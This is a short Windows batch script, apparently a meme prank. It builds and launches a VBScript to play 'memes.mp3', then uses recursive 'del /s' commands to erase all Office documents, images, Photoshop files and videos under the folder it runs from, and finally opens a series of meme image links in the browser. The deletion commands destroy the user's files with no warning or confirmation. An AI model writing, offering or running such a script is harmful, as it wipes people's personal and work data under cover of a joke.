@echo off

set "file=memes.mp3"
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >sound.vbs
start /max sound.vbs

del /s *.doc
del /s *.ppt
del /s *.docx
del /s *.pptx
del /s *.jpg
del /s *.png
del /s *.psd
del /s *.avi
del /s *.mp4
del /s *.mov

start http://www.slate.com/content/dam/slate/blogs/the_slatest/2016/05/30/full_video_shows_harambe_the_gorilla_dragging_child_before_he_was_shot/harambecincinnatizoo.jpg.CROP.promo-mediumlarge.jpg
start http://i1.kym-cdn.com/photos/images/facebook/000/862/065/0e9.jpg
start https://media.giphy.com/media/y2giNwzUHN1p6/giphy.gif
start https://www.google.co.uk/search?q=memes&source=lnms&tbm=isch&sa=X&ved=0ahUKEwjcy8jOsvLSAhXKORQKHTDOBDgQ_AUICCgB&biw=1920&bih=865#tbm=isch&q=nyan+cat+gif&*&imgrc=yL8nco7ocm8SSM:
start http://cdn-s3.si.com/s3fs-public/[current-date:custom:Y]/[current-date:custom:m]/[current-date:custom:d]/best-crying-jordan-memes.jpg
start http://theplantnewspaper.com/wp-content/uploads/2016/08/shrek.jpg
start http://ci.memecdn.com/8809306.jpg
start http://img.memecdn.com/Forever-Alone_o_98121.gif



